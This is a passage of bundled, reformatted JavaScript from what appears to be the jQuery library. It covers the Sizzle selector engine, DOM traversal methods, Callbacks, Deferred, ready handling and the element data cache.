          (T.getElementsByClassName = me.test($.getElementsByClassName)),
          (T.getById = o(function (e) {
            return (O.appendChild(e).id = R), !$.getElementsByName || !$.getElementsByName(R).length;
          })),
          T.getById
            ? ((_.find.ID = function (e, t) {
                if (void 0 !== t.getElementById && j) {
                  var n = t.getElementById(e);
                  return n ? [n] : [];
                }
              }),
              (_.filter.ID = function (e) {
                var t = e.replace(be, Te);
                return function (e) {
                  return e.getAttribute("id") === t;
                };
              }))
            : (delete _.find.ID,
              (_.filter.ID = function (e) {
                var t = e.replace(be, Te);
                return function (e) {
                  var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                  return n && n.value === t;
                };
              })),
          (_.find.TAG = T.getElementsByTagName
            ? function (e, t) {
                return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : T.qsa ? t.querySelectorAll(e) : void 0;
              }
            : function (e, t) {
                var n,
                  i = [],
                  o = 0,
                  r = t.getElementsByTagName(e);
                if ("*" === e) {
                  for (; (n = r[o++]); ) 1 === n.nodeType && i.push(n);
                  return i;
                }
                return r;
              }),
          (_.find.CLASS =
            T.getElementsByClassName &&
            function (e, t) {
              return void 0 !== t.getElementsByClassName && j ? t.getElementsByClassName(e) : void 0;
            }),
          (P = []),
          (H = []),
          (T.qsa = me.test($.querySelectorAll)) &&
            (o(function (e) {
              (O.appendChild(e).innerHTML = "<a id='" + R + "'></a><select id='" + R + "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                e.querySelectorAll("[msallowcapture^='']").length && H.push("[*^$]=" + ne + "*(?:''|\"\")"),
                e.querySelectorAll("[selected]").length || H.push("\\[" + ne + "*(?:value|" + te + ")"),
                e.querySelectorAll("[id~=" + R + "-]").length || H.push("~="),
                e.querySelectorAll(":checked").length || H.push(":checked"),
                e.querySelectorAll("a#" + R + "+*").length || H.push(".#.+[+~]");
            }),
            o(function (e) {
              var t = $.createElement("input");
              t.setAttribute("type", "hidden"),
                e.appendChild(t).setAttribute("name", "D"),
                e.querySelectorAll("[name=d]").length && H.push("name" + ne + "*[*^$|!~]?="),
                e.querySelectorAll(":enabled").length || H.push(":enabled", ":disabled"),
                e.querySelectorAll("*,:x"),
                H.push(",.*:");
            })),
          (T.matchesSelector = me.test((L = O.matches || O.webkitMatchesSelector || O.mozMatchesSelector || O.oMatchesSelector || O.msMatchesSelector))) &&
            o(function (e) {
              (T.disconnectedMatch = L.call(e, "div")), L.call(e, "[s!='']:x"), P.push("!=", re);
            }),
          (H = H.length && new RegExp(H.join("|"))),
          (P = P.length && new RegExp(P.join("|"))),
          (t = me.test(O.compareDocumentPosition)),
          (M =
            t || me.test(O.contains)
              ? function (e, t) {
                  var n = 9 === e.nodeType ? e.documentElement : e,
                    i = t && t.parentNode;
                  return e === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(i)));
                }
              : function (e, t) {
                  if (t) for (; (t = t.parentNode); ) if (t === e) return !0;
                  return !1;
                }),
          (K = t
            ? function (e, t) {
                if (e === t) return (N = !0), 0;
                var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
                return (
                  n ||
                  (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || (!T.sortDetached && t.compareDocumentPosition(e) === n)
                    ? e === $ || (e.ownerDocument === q && M(q, e))
                      ? -1
                      : t === $ || (t.ownerDocument === q && M(q, t))
                      ? 1
                      : D
                      ? ee(D, e) - ee(D, t)
                      : 0
                    : 4 & n
                    ? -1
                    : 1)
                );
              }
            : function (e, t) {
                if (e === t) return (N = !0), 0;
                var n,
                  i = 0,
                  o = e.parentNode,
                  r = t.parentNode,
                  a = [e],
                  l = [t];
                if (!o || !r) return e === $ ? -1 : t === $ ? 1 : o ? -1 : r ? 1 : D ? ee(D, e) - ee(D, t) : 0;
                if (o === r) return s(e, t);
                for (n = e; (n = n.parentNode); ) a.unshift(n);
                for (n = t; (n = n.parentNode); ) l.unshift(n);
                for (; a[i] === l[i]; ) i++;
                return i ? s(a[i], l[i]) : a[i] === q ? -1 : l[i] === q ? 1 : 0;
              }),
          $)
        : $;
    }),
    (t.matches = function (e, n) {
      return t(e, null, null, n);
    }),
    (t.matchesSelector = function (e, n) {
      if (((e.ownerDocument || e) !== $ && I(e), (n = n.replace(ue, "='$1']")), T.matchesSelector && j && !U[n + " "] && (!P || !P.test(n)) && (!H || !H.test(n))))
        try {
          var i = L.call(e, n);
          if (i || T.disconnectedMatch || (e.document && 11 !== e.document.nodeType)) return i;
        } catch (e) {}
      return t(n, $, null, [e]).length > 0;
    }),
    (t.contains = function (e, t) {
      return (e.ownerDocument || e) !== $ && I(e), M(e, t);
    }),
    (t.attr = function (e, t) {
      (e.ownerDocument || e) !== $ && I(e);
      var n = _.attrHandle[t.toLowerCase()],
        i = n && Y.call(_.attrHandle, t.toLowerCase()) ? n(e, t, !j) : void 0;
      return void 0 !== i ? i : T.attributes || !j ? e.getAttribute(t) : (i = e.getAttributeNode(t)) && i.specified ? i.value : null;
    }),
    (t.error = function (e) {
      throw new Error("Syntax error, unrecognized expression: " + e);
    }),
    (t.uniqueSort = function (e) {
      var t,
        n = [],
        i = 0,
        o = 0;
      if (((N = !T.detectDuplicates), (D = !T.sortStable && e.slice(0)), e.sort(K), N)) {
        for (; (t = e[o++]); ) t === e[o] && (i = n.push(o));
        for (; i--; ) e.splice(n[i], 1);
      }
      return (D = null), e;
    }),
    (C = t.getText = function (e) {
      var t,
        n = "",
        i = 0,
        o = e.nodeType;
      if (o) {
        if (1 === o || 9 === o || 11 === o) {
          if ("string" == typeof e.textContent) return e.textContent;
          for (e = e.firstChild; e; e = e.nextSibling) n += C(e);
        } else if (3 === o || 4 === o) return e.nodeValue;
      } else for (; (t = e[i++]); ) n += C(t);
      return n;
    }),
    ((_ = t.selectors = {
      cacheLength: 50,
      createPseudo: i,
      match: fe,
      attrHandle: {},
      find: {},
      relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } },
      preFilter: {
        ATTR: function (e) {
          return (e[1] = e[1].replace(be, Te)), (e[3] = (e[3] || e[4] || e[5] || "").replace(be, Te)), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4);
        },
        CHILD: function (e) {
          return (
            (e[1] = e[1].toLowerCase()),
            "nth" === e[1].slice(0, 3) ? (e[3] || t.error(e[0]), (e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3]))), (e[5] = +(e[7] + e[8] || "odd" === e[3]))) : e[3] && t.error(e[0]),
            e
          );
        },
        PSEUDO: function (e) {
          var t,
            n = !e[6] && e[2];
          return fe.CHILD.test(e[0]) ? null : (e[3] ? (e[2] = e[4] || e[5] || "") : n && de.test(n) && (t = S(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && ((e[0] = e[0].slice(0, t)), (e[2] = n.slice(0, t))), e.slice(0, 3));
        },
      },
      filter: {
        TAG: function (e) {
          var t = e.replace(be, Te).toLowerCase();
          return "*" === e
            ? function () {
                return !0;
              }
            : function (e) {
                return e.nodeName && e.nodeName.toLowerCase() === t;
              };
        },
        CLASS: function (e) {
          var t = z[e + " "];
          return (
            t ||
            ((t = new RegExp("(^|" + ne + ")" + e + "(" + ne + "|$)")) &&
              z(e, function (e) {
                return t.test(("string" == typeof e.className && e.className) || (void 0 !== e.getAttribute && e.getAttribute("class")) || "");
              }))
          );
        },
        ATTR: function (e, n, i) {
          return function (o) {
            var r = t.attr(o, e);
            return null == r
              ? "!=" === n
              : !n ||
                  ((r += ""),
                  "=" === n
                    ? r === i
                    : "!=" === n
                    ? r !== i
                    : "^=" === n
                    ? i && 0 === r.indexOf(i)
                    : "*=" === n
                    ? i && r.indexOf(i) > -1
                    : "$=" === n
                    ? i && r.slice(-i.length) === i
                    : "~=" === n
                    ? (" " + r.replace(se, " ") + " ").indexOf(i) > -1
                    : "|=" === n && (r === i || r.slice(0, i.length + 1) === i + "-"));
          };
        },
        CHILD: function (e, t, n, i, o) {
          var r = "nth" !== e.slice(0, 3),
            s = "last" !== e.slice(-4),
            a = "of-type" === t;
          return 1 === i && 0 === o
            ? function (e) {
                return !!e.parentNode;
              }
            : function (t, n, l) {
                var c,
                  u,
                  d,
                  p,
                  f,
                  h,
                  g = r !== s ? "nextSibling" : "previousSibling",
                  m = t.parentNode,
                  v = a && t.nodeName.toLowerCase(),
                  y = !l && !a,
                  w = !1;
                if (m) {
                  if (r) {
                    for (; g; ) {
                      for (p = t; (p = p[g]); ) if (a ? p.nodeName.toLowerCase() === v : 1 === p.nodeType) return !1;
                      h = g = "only" === e && !h && "nextSibling";
                    }
                    return !0;
                  }
                  if (((h = [s ? m.firstChild : m.lastChild]), s && y)) {
                    for (w = (f = (c = (u = (d = (p = m)[R] || (p[R] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === W && c[1]) && c[2], p = f && m.childNodes[f]; (p = (++f && p && p[g]) || (w = f = 0) || h.pop()); )
                      if (1 === p.nodeType && ++w && p === t) {
                        u[e] = [W, f, w];
                        break;
                      }
                  } else if ((y && (w = f = (c = (u = (d = (p = t)[R] || (p[R] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === W && c[1]), !1 === w))
                    for (
                      ;
                      (p = (++f && p && p[g]) || (w = f = 0) || h.pop()) &&
                      ((a ? p.nodeName.toLowerCase() !== v : 1 !== p.nodeType) || !++w || (y && ((u = (d = p[R] || (p[R] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] = [W, w]), p !== t));

                    );
                  return (w -= o) === i || (w % i == 0 && w / i >= 0);
                }
              };
        },
        PSEUDO: function (e, n) {
          var o,
            r = _.pseudos[e] || _.setFilters[e.toLowerCase()] || t.error("unsupported pseudo: " + e);
          return r[R]
            ? r(n)
            : r.length > 1
            ? ((o = [e, e, "", n]),
              _.setFilters.hasOwnProperty(e.toLowerCase())
                ? i(function (e, t) {
                    for (var i, o = r(e, n), s = o.length; s--; ) e[(i = ee(e, o[s]))] = !(t[i] = o[s]);
                  })
                : function (e) {
                    return r(e, 0, o);
                  })
            : r;
        },
      },
      pseudos: {
        not: i(function (e) {
          var t = [],
            n = [],
            o = x(e.replace(ae, "$1"));
          return o[R]
            ? i(function (e, t, n, i) {
                for (var r, s = o(e, null, i, []), a = e.length; a--; ) (r = s[a]) && (e[a] = !(t[a] = r));
              })
            : function (e, i, r) {
                return (t[0] = e), o(t, null, r, n), (t[0] = null), !n.pop();
              };
        }),
        has: i(function (e) {
          return function (n) {
            return t(e, n).length > 0;
          };
        }),
        contains: i(function (e) {
          return (
            (e = e.replace(be, Te)),
            function (t) {
              return (t.textContent || t.innerText || C(t)).indexOf(e) > -1;
            }
          );
        }),
        lang: i(function (e) {
          return (
            pe.test(e || "") || t.error("unsupported lang: " + e),
            (e = e.replace(be, Te).toLowerCase()),
            function (t) {
              var n;
              do {
                if ((n = j ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang"))) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-");
              } while ((t = t.parentNode) && 1 === t.nodeType);
              return !1;
            }
          );
        }),
        target: function (t) {
          var n = e.location && e.location.hash;
          return n && n.slice(1) === t.id;
        },
        root: function (e) {
          return e === O;
        },
        focus: function (e) {
          return e === $.activeElement && (!$.hasFocus || $.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
        },
        enabled: function (e) {
          return !1 === e.disabled;
        },
        disabled: function (e) {
          return !0 === e.disabled;
        },
        checked: function (e) {
          var t = e.nodeName.toLowerCase();
          return ("input" === t && !!e.checked) || ("option" === t && !!e.selected);
        },
        selected: function (e) {
          return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected;
        },
        empty: function (e) {
          for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
          return !0;
        },
        parent: function (e) {
          return !_.pseudos.empty(e);
        },
        header: function (e) {
          return ge.test(e.nodeName);
        },
        input: function (e) {
          return he.test(e.nodeName);
        },
        button: function (e) {
          var t = e.nodeName.toLowerCase();
          return ("input" === t && "button" === e.type) || "button" === t;
        },
        text: function (e) {
          var t;
          return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
        },
        first: c(function () {
          return [0];
        }),
        last: c(function (e, t) {
          return [t - 1];
        }),
        eq: c(function (e, t, n) {
          return [0 > n ? n + t : n];
        }),
        even: c(function (e, t) {
          for (var n = 0; t > n; n += 2) e.push(n);
          return e;
        }),
        odd: c(function (e, t) {
          for (var n = 1; t > n; n += 2) e.push(n);
          return e;
        }),
        lt: c(function (e, t, n) {
          for (var i = 0 > n ? n + t : n; --i >= 0; ) e.push(i);
          return e;
        }),
        gt: c(function (e, t, n) {
          for (var i = 0 > n ? n + t : n; ++i < t; ) e.push(i);
          return e;
        }),
      },
    }).pseudos.nth = _.pseudos.eq),
    { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
      _.pseudos[b] = a(b);
    for (b in { submit: !0, reset: !0 }) _.pseudos[b] = l(b);
    return (
      (d.prototype = _.filters = _.pseudos),
      (_.setFilters = new d()),
      (S = t.tokenize = function (e, n) {
        var i,
          o,
          r,
          s,
          a,
          l,
          c,
          u = B[e + " "];
        if (u) return n ? 0 : u.slice(0);
        for (a = e, l = [], c = _.preFilter; a; ) {
          for (s in ((!i || (o = le.exec(a))) && (o && (a = a.slice(o[0].length) || a), l.push((r = []))),
          (i = !1),
          (o = ce.exec(a)) && ((i = o.shift()), r.push({ value: i, type: o[0].replace(ae, " ") }), (a = a.slice(i.length))),
          _.filter))
            !(o = fe[s].exec(a)) || (c[s] && !(o = c[s](o))) || ((i = o.shift()), r.push({ value: i, type: s, matches: o }), (a = a.slice(i.length)));
          if (!i) break;
        }
        return n ? a.length : a ? t.error(e) : B(e, l).slice(0);
      }),
      (x = t.compile = function (e, t) {
        var n,
          i = [],
          o = [],
          r = U[e + " "];
        if (!r) {
          for (t || (t = S(e)), n = t.length; n--; ) (r = y(t[n]))[R] ? i.push(r) : o.push(r);
          (r = U(e, w(o, i))).selector = e;
        }
        return r;
      }),
      (E = t.select = function (e, t, n, i) {
        var o,
          r,
          s,
          a,
          l,
          c = "function" == typeof e && e,
          d = !i && S((e = c.selector || e));
        if (((n = n || []), 1 === d.length)) {
          if ((r = d[0] = d[0].slice(0)).length > 2 && "ID" === (s = r[0]).type && T.getById && 9 === t.nodeType && j && _.relative[r[1].type]) {
            if (!(t = (_.find.ID(s.matches[0].replace(be, Te), t) || [])[0])) return n;
            c && (t = t.parentNode), (e = e.slice(r.shift().value.length));
          }
          for (o = fe.needsContext.test(e) ? 0 : r.length; o-- && ((s = r[o]), !_.relative[(a = s.type)]); )
            if ((l = _.find[a]) && (i = l(s.matches[0].replace(be, Te), (ye.test(r[0].type) && u(t.parentNode)) || t))) {
              if ((r.splice(o, 1), !(e = i.length && p(r)))) return J.apply(n, i), n;
              break;
            }
        }
        return (c || x(e, d))(i, t, !j, n, !t || (ye.test(e) && u(t.parentNode)) || t), n;
      }),
      (T.sortStable = R.split("").sort(K).join("") === R),
      (T.detectDuplicates = !!N),
      I(),
      (T.sortDetached = o(function (e) {
        return 1 & e.compareDocumentPosition($.createElement("div"));
      })),
      o(function (e) {
        return (e.innerHTML = "<a href='#'></a>"), "#" === e.firstChild.getAttribute("href");
      }) ||
        r("type|href|height|width", function (e, t, n) {
          return n ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
        }),
      (T.attributes &&
        o(function (e) {
          return (e.innerHTML = "<input/>"), e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value");
        })) ||
        r("value", function (e, t, n) {
          return n || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue;
        }),
      o(function (e) {
        return null == e.getAttribute("disabled");
      }) ||
        r(te, function (e, t, n) {
          var i;
          return n ? void 0 : !0 === e[t] ? t.toLowerCase() : (i = e.getAttributeNode(t)) && i.specified ? i.value : null;
        }),
      t
    );
  })(e);
  (ee.find = re), (ee.expr = re.selectors), (ee.expr[":"] = ee.expr.pseudos), (ee.uniqueSort = ee.unique = re.uniqueSort), (ee.text = re.getText), (ee.isXMLDoc = re.isXML), (ee.contains = re.contains);
  var se = function (e, t, n) {
      for (var i = [], o = void 0 !== n; (e = e[t]) && 9 !== e.nodeType; )
        if (1 === e.nodeType) {
          if (o && ee(e).is(n)) break;
          i.push(e);
        }
      return i;
    },
    ae = function (e, t) {
      for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
      return n;
    },
    le = ee.expr.match.needsContext,
    ce = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,
    ue = /^.[^:#\[\.,]*$/;
  (ee.filter = function (e, t, n) {
    var i = t[0];
    return (
      n && (e = ":not(" + e + ")"),
      1 === t.length && 1 === i.nodeType
        ? ee.find.matchesSelector(i, e)
          ? [i]
          : []
        : ee.find.matches(
            e,
            ee.grep(t, function (e) {
              return 1 === e.nodeType;
            })
          )
    );
  }),
    ee.fn.extend({
      find: function (e) {
        var t,
          n = this.length,
          i = [],
          o = this;
        if ("string" != typeof e)
          return this.pushStack(
            ee(e).filter(function () {
              for (t = 0; n > t; t++) if (ee.contains(o[t], this)) return !0;
            })
          );
        for (t = 0; n > t; t++) ee.find(e, o[t], i);
        return ((i = this.pushStack(n > 1 ? ee.unique(i) : i)).selector = this.selector ? this.selector + " " + e : e), i;
      },
      filter: function (e) {
        return this.pushStack(i(this, e || [], !1));
      },
      not: function (e) {
        return this.pushStack(i(this, e || [], !0));
      },
      is: function (e) {
        return !!i(this, "string" == typeof e && le.test(e) ? ee(e) : e || [], !1).length;
      },
    });
  var de,
    pe = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
  ((ee.fn.init = function (e, t, n) {
    var i, o;
    if (!e) return this;
    if (((n = n || de), "string" == typeof e)) {
      if (!(i = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : pe.exec(e)) || (!i[1] && t)) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
      if (i[1]) {
        if (((t = t instanceof ee ? t[0] : t), ee.merge(this, ee.parseHTML(i[1], t && t.nodeType ? t.ownerDocument || t : B, !0)), ce.test(i[1]) && ee.isPlainObject(t)))
          for (i in t) ee.isFunction(this[i]) ? this[i](t[i]) : this.attr(i, t[i]);
        return this;
      }
      return (o = B.getElementById(i[2])) && o.parentNode && ((this.length = 1), (this[0] = o)), (this.context = B), (this.selector = e), this;
    }
    return e.nodeType
      ? ((this.context = this[0] = e), (this.length = 1), this)
      : ee.isFunction(e)
      ? void 0 !== n.ready
        ? n.ready(e)
        : e(ee)
      : (void 0 !== e.selector && ((this.selector = e.selector), (this.context = e.context)), ee.makeArray(e, this));
  }).prototype = ee.fn),
    (de = ee(B));
  var fe = /^(?:parents|prev(?:Until|All))/,
    he = { children: !0, contents: !0, next: !0, prev: !0 };
  ee.fn.extend({
    has: function (e) {
      var t = ee(e, this),
        n = t.length;
      return this.filter(function () {
        for (var e = 0; n > e; e++) if (ee.contains(this, t[e])) return !0;
      });
    },
    closest: function (e, t) {
      for (var n, i = 0, o = this.length, r = [], s = le.test(e) || "string" != typeof e ? ee(e, t || this.context) : 0; o > i; i++)
        for (n = this[i]; n && n !== t; n = n.parentNode)
          if (n.nodeType < 11 && (s ? s.index(n) > -1 : 1 === n.nodeType && ee.find.matchesSelector(n, e))) {
            r.push(n);
            break;
          }
      return this.pushStack(r.length > 1 ? ee.uniqueSort(r) : r);
    },
    index: function (e) {
      return e ? ("string" == typeof e ? Y.call(ee(e), this[0]) : Y.call(this, e.jquery ? e[0] : e)) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
    },
    add: function (e, t) {
      return this.pushStack(ee.uniqueSort(ee.merge(this.get(), ee(e, t))));
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    },
  }),
    ee.each(
      {
        parent: function (e) {
          var t = e.parentNode;
          return t && 11 !== t.nodeType ? t : null;
        },
        parents: function (e) {
          return se(e, "parentNode");
        },
        parentsUntil: function (e, t, n) {
          return se(e, "parentNode", n);
        },
        next: function (e) {
          return o(e, "nextSibling");
        },
        prev: function (e) {
          return o(e, "previousSibling");
        },
        nextAll: function (e) {
          return se(e, "nextSibling");
        },
        prevAll: function (e) {
          return se(e, "previousSibling");
        },
        nextUntil: function (e, t, n) {
          return se(e, "nextSibling", n);
        },
        prevUntil: function (e, t, n) {
          return se(e, "previousSibling", n);
        },
        siblings: function (e) {
          return ae((e.parentNode || {}).firstChild, e);
        },
        children: function (e) {
          return ae(e.firstChild);
        },
        contents: function (e) {
          return e.contentDocument || ee.merge([], e.childNodes);
        },
      },
      function (e, t) {
        ee.fn[e] = function (n, i) {
          var o = ee.map(this, t, n);
          return "Until" !== e.slice(-5) && (i = n), i && "string" == typeof i && (o = ee.filter(i, o)), this.length > 1 && (he[e] || ee.uniqueSort(o), fe.test(e) && o.reverse()), this.pushStack(o);
        };
      }
    );
  var ge,
    me = /\S+/g;
  (ee.Callbacks = function (e) {
    e =
      "string" == typeof e
        ? (function (e) {
            var t = {};
            return (
              ee.each(e.match(me) || [], function (e, n) {
                t[n] = !0;
              }),
              t
            );
          })(e)
        : ee.extend({}, e);
    var t,
      n,
      i,
      o,
      r = [],
      s = [],
      a = -1,
      l = function () {
        for (o = e.once, i = t = !0; s.length; a = -1) for (n = s.shift(); ++a < r.length; ) !1 === r[a].apply(n[0], n[1]) && e.stopOnFalse && ((a = r.length), (n = !1));
        e.memory || (n = !1), (t = !1), o && (r = n ? [] : "");
      },
      c = {
        add: function () {
          return (
            r &&
              (n && !t && ((a = r.length - 1), s.push(n)),
              (function t(n) {
                ee.each(n, function (n, i) {
                  ee.isFunction(i) ? (e.unique && c.has(i)) || r.push(i) : i && i.length && "string" !== ee.type(i) && t(i);
                });
              })(arguments),
              n && !t && l()),
            this
          );
        },
        remove: function () {
          return (
            ee.each(arguments, function (e, t) {
              for (var n; (n = ee.inArray(t, r, n)) > -1; ) r.splice(n, 1), a >= n && a--;
            }),
            this
          );
        },
        has: function (e) {
          return e ? ee.inArray(e, r) > -1 : r.length > 0;
        },
        empty: function () {
          return r && (r = []), this;
        },
        disable: function () {
          return (o = s = []), (r = n = ""), this;
        },
        disabled: function () {
          return !r;
        },
        lock: function () {
          return (o = s = []), n || (r = n = ""), this;
        },
        locked: function () {
          return !!o;
        },
        fireWith: function (e, n) {
          return o || ((n = [e, (n = n || []).slice ? n.slice() : n]), s.push(n), t || l()), this;
        },
        fire: function () {
          return c.fireWith(this, arguments), this;
        },
        fired: function () {
          return !!i;
        },
      };
    return c;
  }),
    ee.extend({
      Deferred: function (e) {
        var t = [
            ["resolve", "done", ee.Callbacks("once memory"), "resolved"],
            ["reject", "fail", ee.Callbacks("once memory"), "rejected"],
            ["notify", "progress", ee.Callbacks("memory")],
          ],
          n = "pending",
          i = {
            state: function () {
              return n;
            },
            always: function () {
              return o.done(arguments).fail(arguments), this;
            },
            then: function () {
              var e = arguments;
              return ee
                .Deferred(function (n) {
                  ee.each(t, function (t, r) {
                    var s = ee.isFunction(e[t]) && e[t];
                    o[r[1]](function () {
                      var e = s && s.apply(this, arguments);
                      e && ee.isFunction(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[r[0] + "With"](this === i ? n.promise() : this, s ? [e] : arguments);
                    });
                  }),
                    (e = null);
                })
                .promise();
            },
            promise: function (e) {
              return null != e ? ee.extend(e, i) : i;
            },
          },
          o = {};
        return (
          (i.pipe = i.then),
          ee.each(t, function (e, r) {
            var s = r[2],
              a = r[3];
            (i[r[1]] = s.add),
              a &&
                s.add(
                  function () {
                    n = a;
                  },
                  t[1 ^ e][2].disable,
                  t[2][2].lock
                ),
              (o[r[0]] = function () {
                return o[r[0] + "With"](this === o ? i : this, arguments), this;
              }),
              (o[r[0] + "With"] = s.fireWith);
          }),
          i.promise(o),
          e && e.call(o, o),
          o
        );
      },
      when: function (e) {
        var t,
          n,
          i,
          o = 0,
          r = U.call(arguments),
          s = r.length,
          a = 1 !== s || (e && ee.isFunction(e.promise)) ? s : 0,
          l = 1 === a ? e : ee.Deferred(),
          c = function (e, n, i) {
            return function (o) {
              (n[e] = this), (i[e] = arguments.length > 1 ? U.call(arguments) : o), i === t ? l.notifyWith(n, i) : --a || l.resolveWith(n, i);
            };
          };
        if (s > 1) for (t = new Array(s), n = new Array(s), i = new Array(s); s > o; o++) r[o] && ee.isFunction(r[o].promise) ? r[o].promise().progress(c(o, n, t)).done(c(o, i, r)).fail(l.reject) : --a;
        return a || l.resolveWith(i, r), l.promise();
      },
    }),
    (ee.fn.ready = function (e) {
      return ee.ready.promise().done(e), this;
    }),
    ee.extend({
      isReady: !1,
      readyWait: 1,
      holdReady: function (e) {
        e ? ee.readyWait++ : ee.ready(!0);
      },
      ready: function (e) {
        (!0 === e ? --ee.readyWait : ee.isReady) || ((ee.isReady = !0), (!0 !== e && --ee.readyWait > 0) || (ge.resolveWith(B, [ee]), ee.fn.triggerHandler && (ee(B).triggerHandler("ready"), ee(B).off("ready"))));
      },
    }),
    (ee.ready.promise = function (t) {
      return (
        ge || ((ge = ee.Deferred()), "complete" === B.readyState || ("loading" !== B.readyState && !B.documentElement.doScroll) ? e.setTimeout(ee.ready) : (B.addEventListener("DOMContentLoaded", r), e.addEventListener("load", r))),
        ge.promise(t)
      );
    }),
    ee.ready.promise();
  var ve = function (e, t, n, i, o, r, s) {
      var a = 0,
        l = e.length,
        c = null == n;
      if ("object" === ee.type(n)) for (a in ((o = !0), n)) ve(e, t, a, n[a], !0, r, s);
      else if (
        void 0 !== i &&
        ((o = !0),
        ee.isFunction(i) || (s = !0),
        c &&
          (s
            ? (t.call(e, i), (t = null))
            : ((c = t),
              (t = function (e, t, n) {
                return c.call(ee(e), n);
              }))),
        t)
      )
        for (; l > a; a++) t(e[a], n, s ? i : i.call(e[a], a, t(e[a], n)));
      return o ? e : c ? t.call(e) : l ? t(e[0], n) : r;
    },
    ye = function (e) {
      return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
    };
  (s.uid = 1),
    (s.prototype = {
      register: function (e, t) {
        var n = t || {};
        return e.nodeType ? (e[this.expando] = n) : Object.defineProperty(e, this.expando, { value: n, writable: !0, configurable: !0 }), e[this.expando];
      },
      cache: function (e) {
        if (!ye(e)) return {};
        var t = e[this.expando];
        return t || ((t = {}), ye(e) && (e.nodeType ? (e[this.expando] = t) : Object.defineProperty(e, this.expando, { value: t, configurable: !0 }))), t;
      },
      set: function (e, t, n) {
        var i,
          o = this.cache(e);
        if ("string" == typeof t) o[t] = n;
        else for (i in t) o[i] = t[i];
        return o;
      },
      get: function (e, t) {
        return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][t];
      },
      access: function (e, t, n) {
        var i;
        return void 0 === t || (t && "string" == typeof t && void 0 === n) ? (void 0 !== (i = this.get(e, t)) ? i : this.get(e, ee.camelCase(t))) : (this.set(e, t, n), void 0 !== n ? n : t);
      },
      remove: function (e, t) {
        var n,
          i,
          o,
          r = e[this.expando];
        if (void 0 !== r) {
          if (void 0 === t) this.register(e);
          else {
            ee.isArray(t) ? (i = t.concat(t.map(ee.camelCase))) : ((o = ee.camelCase(t)), t in r ? (i = [t, o]) : (i = (i = o) in r ? [i] : i.match(me) || [])), (n = i.length);
            for (; n--; ) delete r[i[n]];
          }
          (void 0 === t || ee.isEmptyObject(r)) && (e.nodeType ? (e[this.expando] = void 0) : delete e[this.expando]);
        }
      },
      hasData: function (e) {
        var t = e[this.expando];
        return void 0 !== t && !ee.isEmptyObject(t);
      },
    });
  var we = new s(),
    be = new s(),
    Te = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    _e = /[A-Z]/g;
  ee.extend({
    hasData: function (e) {
      return be.hasData(e) || we.hasData(e);
    },
    data: function (e, t, n) {
      return be.access(e, t, n);
    },
    removeData: function (e, t) {
      be.remove(e, t);
    },
    _data: function (e, t, n) {
      return we.access(e, t, n);
    },
    _removeData: function (e, t) {
      we.remove(e, t);
    },
  }),
    ee.fn.extend({
      data: function (e, t) {
        var n,
          i,
          o,
          r = this[0],
          s = r && r.attributes;
        if (void 0 === e) {
          if (this.length && ((o = be.get(r)), 1 === r.nodeType && !we.get(r, "hasDataAttrs"))) {
            for (n = s.length; n--; ) s[n] && 0 === (i = s[n].name).indexOf("data-") && ((i = ee.camelCase(i.slice(5))), a(r, i, o[i]));
            we.set(r, "hasDataAttrs", !0);
          }
          return o;
        }
        return "object" == typeof e
          ? this.each(function () {
              be.set(this, e);
            })
          : ve(
              this,
              function (t) {
                var n, i;
                if (r && void 0 === t) {
                  if (void 0 !== (n = be.get(r, e) || be.get(r, e.replace(_e, "-$&").toLowerCase()))) return n;
                  if (((i = ee.camelCase(e)), void 0 !== (n = be.get(r, i)))) return n;
                  if (void 0 !== (n = a(r, i, void 0))) return n;
                } else
                  (i = ee.camelCase(e)),
                    this.each(function () {
                      var n = be.get(this, i);
                      be.set(this, i, t), e.indexOf("-") > -1 && void 0 !== n && be.set(this, e, t);
                    });
              },
              null,
              t,
              arguments.length > 1,
              null,
              !0
            );
      },
      removeData: function (e) {
        return this.each(function () {
          be.remove(this, e);
        });
      },
    }),
    ee.extend({
      queue: function (e, t, n) {
        var i;
        return e ? ((t = (t || "fx") + "queue"), (i = we.get(e, t)), n && (!i || ee.isArray(n) ? (i = we.access(e, t, ee.makeArray(n))) : i.push(n)), i || []) : void 0;
      },
